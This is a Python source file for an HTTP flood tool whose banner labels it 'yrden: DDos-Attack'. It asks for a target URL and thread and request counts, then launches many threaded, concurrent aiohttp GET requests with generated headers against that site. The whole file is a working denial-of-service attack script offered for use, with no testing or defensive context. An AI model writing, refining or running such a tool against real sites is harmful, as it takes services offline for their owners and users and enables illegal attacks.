import asyncio
import os
from datetime import datetime
from threading import Thread

import aiohttp
from colorama import Fore

from generate_headers import initHeaders


def clear ():
    if os.name == 'nt':
        os.system ('cls')
    else:
        os.system ('clear')


def timestamp (function):
    def wrapper (*args):

        start = datetime.now ()
        function (*args)
        end = datetime.now ()

        print ('This thread has gone ' + str (end - start))

    return wrapper


async def make_request (url: str):    
    async with aiohttp.ClientSession () as session:
        try:
            async with session.get (url, headers = initHeaders ()) as response:
                print (Fore.GREEN + 'Request for ' + url + ' Completed' + Fore.RESET)
        except:
            print (Fore.RED + 'Request for ' + url + ' Not done' + Fore.RESET)


   
async def main (url: str, tasksCount: int):

    tasks = []
    
    for i in range (tasksCount):            
        task = asyncio.create_task (make_request (url))
        tasks.append (task)
           
    await asyncio.gather (*tasks)


@timestamp
def start (url: str,  tasksCount: int):
    asyncio.run (main (url, tasksCount))


if __name__ == '__main__':

    clear ()

    print ('''

 ▄ ▄▄▄▄  ▄▄▄ ▄ ▄▄ ▄ ▄ ▄▄ ▄ ▄ ▄
 ▄                           ▄
  ▄                          ▄
    ▄       ▄▄▄▄ ▄ ▄ ▄▄      ▄
      ▄      ▄▄       ▄      ▄
        ▄      ▄     ▄      ▄
         ▄       █  ▄▄▄ ▄ ▄   
           ▄       ▄ 
             ▄       ▄
              █       █ ▪
       ▄ ▄▄▄ ▄   ▄       ▄
     ▄      ▄      ▄        ▄ 
    ▄      ▀        ▄         ▄
   ▄         ▀▀▄▄▄▄        ▄    ▄
  ▄                               ▄
  ▄▄ ▄▄▄▄ ▄ ▄▄▄ ▄▄▄ ▄ ▄▄▄  ▄ ▄▄  ▄ ▄ 


        yrden: DDos-Attack       
                

    ''')

    #ask custom param
    url = str (input ('Url site: '))
    threadCount = int (input ('Number of threads: '))
    tasksCount = int (input ('Number of requests for each thread: '))
    
    #init threads
    for i in range (threadCount):
        t = Thread (target = start, name = f'thread{i}', args = (url, tasksCount))
        t.start ()
